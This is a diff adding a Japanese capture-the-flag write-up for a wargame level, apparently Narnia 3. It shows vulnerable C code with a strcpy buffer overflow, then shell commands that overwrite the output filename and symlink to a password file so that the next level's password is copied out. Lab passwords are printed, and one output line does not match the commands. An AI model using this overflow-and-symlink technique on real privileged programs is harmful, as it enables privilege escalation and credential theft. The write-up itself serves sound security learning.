@@ -179,4 +179,72 @@ $ cat /etc/narnia_pass/narnia3
 vaequeezee
 ```
 
+## Level 3
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
 
+int main(int argc, char **argv){
+
+        int  ifd,  ofd;
+        char ofile[16] = "/dev/null";
+        char ifile[32];
+        char buf[32];
+
+        if(argc != 2){
+                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+                exit(-1);
+        }
+
+        /* open files */
+        strcpy(ifile, argv[1]);
+        if((ofd = open(ofile,O_RDWR)) < 0 ){
+                printf("error opening %s\n", ofile);
+                exit(-1);
+        }
+        if((ifd = open(ifile, O_RDONLY)) < 0 ){
+                printf("error opening %s\n", ifile);
+                exit(-1);
+        }
+
+        /* copy from file1 to file2 */
+        read(ifd, buf, sizeof(buf)-1);
+        write(ofd,buf, sizeof(buf)-1);
+        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+
+        /* close 'em */
+        close(ifd);
+        close(ofd);
+
+        exit(1);
+}
+```
+コマンドライン引数に与えたファイルの中身を/dev/nullに書き込む.
+
+/etc/narnia_pass/narnia4を/dev/nullじゃないところに書き込めれば良さそう.
+
+ifile[32]から溢れた文字列がofileを書き換えてしまう。
+
+`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`とするとofileは/tmp/outに上書きされる。この時ifileは`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`なので、
+
+`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`の中身が/tmp/outに書かれることになる。
+
+narnia4のパスワードが見たいので、`/etc/narnia_pass/narnia4`へのリンクをはる.
+```
+$ mkdir `python -c 'print "/tmp/" + "B"*27'`
+$ cd tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB
+$ mkdir tmp
+$ cd tmp
+$ touch out 
+$ chmod 777 out
+$ ln -s /etc/narnia_pass/narnia4 ./out
+$ /narnia/narnia3 `python -c'print "/tmp/" + "B"*27 + "/tmp/out"'`
+copied contents of /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/narnia4-kbd to a safer place... (/tmp/out)
+$ cat /tmp/out
+thaenohtai
+```
